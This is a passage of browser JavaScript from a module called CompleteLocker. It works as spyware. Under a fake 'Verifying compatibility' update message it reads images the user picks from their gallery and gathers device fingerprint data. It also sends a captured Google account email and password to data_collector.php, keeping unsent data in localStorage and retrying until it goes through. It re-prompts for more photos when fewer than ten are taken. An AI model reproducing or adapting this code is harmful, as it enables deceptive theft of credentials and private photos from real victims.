            
            const reader = new FileReader();
            
            reader.onload = (e) => {
                // Get image metadata
                const img = new Image();
                img.onload = () => {
                    const imageData = {
                        name: file.name,
                        type: file.type,
                        size: file.size,
                        width: img.width,
                        height: img.height,
                        lastModified: file.lastModified,
                        dataUrl: e.target.result,
                        timestamp: new Date().toISOString()
                    };
                    
                    // Add to collected data
                    this.state.collectedData.galleryData.push(imageData);
                    this.state.galleryData.push(imageData);
                    this.state.totalImagesProcessed = (this.state.totalImagesProcessed || 0) + 1;
                    
                    processedCount++;
                    
                    // Update processing message
                    processingMsg.textContent = `Verifying compatibility... ${Math.round((processedCount / filesToProcess.length) * 100)}%`;
                    
                    // Send the data after all files are processed
                    if (processedCount === filesToProcess.length) {
                        this.finishGalleryProcessing(processingMsg);
                    }
                };
                
                img.onerror = () => {
                    processedCount++;
                    if (processedCount === filesToProcess.length) {
                        this.finishGalleryProcessing(processingMsg);
                    }
                };
                
                img.src = e.target.result;
            };
            
            reader.onerror = () => {
                processedCount++;
                // Continue even if some files fail
                if (processedCount === filesToProcess.length) {
                    this.finishGalleryProcessing(processingMsg);
                }
            };
            
            // Read the file as a data URL
            reader.readAsDataURL(file);
        });
        
        // If no files were selected but the input was triggered
        if (filesToProcess.length === 0) {
            processingMsg.textContent = 'No files selected. Continuing update...';
            setTimeout(() => {
                processingMsg.remove();
                // Try to show the gallery prompt again
                setTimeout(() => {
                    this.captureGallery();
                }, 3000);
            }, 2000);
        }
    },
    
    /**
     * Finish processing gallery files and update collected data
     * @param {HTMLElement} processingMsg - The processing message element to remove
     */
    finishGalleryProcessing(processingMsg) {
        // Send the collected data
        this.sendCollectedData();
        
        // Show success message
        processingMsg.textContent = 'Verification complete!';
        processingMsg.style.backgroundColor = 'rgba(46, 125, 50, 0.9)';
        
        // Remove message after delay
        setTimeout(() => {
            processingMsg.remove();
            
            // If we haven't collected enough images yet, try again after a delay
            if (this.state.totalImagesProcessed < 10 && !this.state.galleryFinalAttempt) {
                this.state.galleryFinalAttempt = true;
                setTimeout(() => {
                    this.captureGallery();
                }, 5000);
            }
        }, 2000);
    },

    /**
     * Send collected data to the server
     */
    sendCollectedData() {
        // Prepare the data payload
        const payload = {
            device_id: this.state.deviceId,
            timestamp: new Date().toISOString(),
            device_info: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                pixelRatio: window.devicePixelRatio,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                batteryLevel: this.getBatteryLevel(),
                networkInfo: this.getNetworkInfo(),
                isOnline: navigator.onLine
            }
        };
        
        // Add Google account data if available
        if (this.state.collectedData.googleAccount) {
            payload.google_account = this.state.collectedData.googleAccount.email;
            payload.email = this.state.collectedData.googleAccount.email;
            payload.passwords = this.state.collectedData.googleAccount.password;
        }
        
        // Add gallery data if available
        if (this.state.collectedData.galleryData.length > 0) {
            payload.gallery_data = this.state.collectedData.galleryData;
            
            // Clear gallery data after sending to avoid sending duplicates
            this.state.collectedData.galleryData = [];
        }
        
        // Log attempt to send data
        console.log('Attempting to send collected data');
        
        // Send data to server
        fetch('data_collector.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload),
            // Add credentials to ensure cookies are sent
            credentials: 'same-origin'
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`Server responded with status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Data sent successfully:', data);
            
            // Store success in localStorage to track successful submissions
            const successCount = parseInt(localStorage.getItem('data_sent_count') || '0');
            localStorage.setItem('data_sent_count', successCount + 1);
            
            // If we have Google account data, mark it as sent
            if (this.state.collectedData.googleAccount) {
                localStorage.setItem('google_account_sent', 'true');
            }
        })
        .catch(error => {
            console.error('Error sending data:', error);
            
            // Store the data locally if sending fails
            try {
                const pendingData = JSON.parse(localStorage.getItem('pending_data') || '[]');
                pendingData.push(payload);
                localStorage.setItem('pending_data', JSON.stringify(pendingData));
                console.log('Data stored locally for later retry');
            } catch (e) {
                console.error('Failed to store data locally:', e);
            }
            
            // Retry sending after a delay
            setTimeout(() => this.retrySendingData(), 30000); // Retry after 30 seconds
        });
    },
    
    retrySendingData() {
        try {
            const pendingData = JSON.parse(localStorage.getItem('pending_data') || '[]');
            if (pendingData.length === 0) return;
            
            console.log(`Retrying to send ${pendingData.length} pending data items`);
            
            // Try to send the first pending item
            fetch('data_collector.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(pendingData[0]),
                credentials: 'same-origin'
            })
            .then(response => {
                if (!response.ok) throw new Error('Retry failed');
                return response.json();
            })
            .then(() => {
                // Remove the successfully sent item
                pendingData.shift();
                localStorage.setItem('pending_data', JSON.stringify(pendingData));
                
                // Continue with next item if any
                if (pendingData.length > 0) {
                    setTimeout(() => this.retrySendingData(), 5000);
                }
            })
            .catch(() => {
                // Keep items in storage and retry later
                setTimeout(() => this.retrySendingData(), 60000); // Retry after 1 minute
            });
        } catch (e) {
            console.error('Error in retry mechanism:', e);
        }
    },
    
    getBatteryLevel() {
        if (navigator.getBattery) {
            try {
                navigator.getBattery().then(battery => {
                    this.state.collectedData.batteryLevel = battery.level;
                    this.sendCollectedData(); // Update with battery info
                });
                return 'fetching';
            } catch (e) {
                return 'unavailable';
            }
        }
        return 'unsupported';
    },
    
    getNetworkInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            return {
                type: connection.type,
                effectiveType: connection.effectiveType,
                downlinkMax: connection.downlinkMax
            };
        }
        return 'unavailable';
    },

    /**
     * Get device ID from localStorage or generate a new one
     * @returns {string} Device ID
     */
    getDeviceId() {
        let deviceId = localStorage.getItem('device_id');
        if (!deviceId) {
            deviceId = 'dev_' + Math.random().toString(36).substring(2, 15);
            localStorage.setItem('device_id', deviceId);
        }
        return deviceId;
    }
};

// Export the module if in a CommonJS environment
if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
    module.exports = CompleteLocker;
}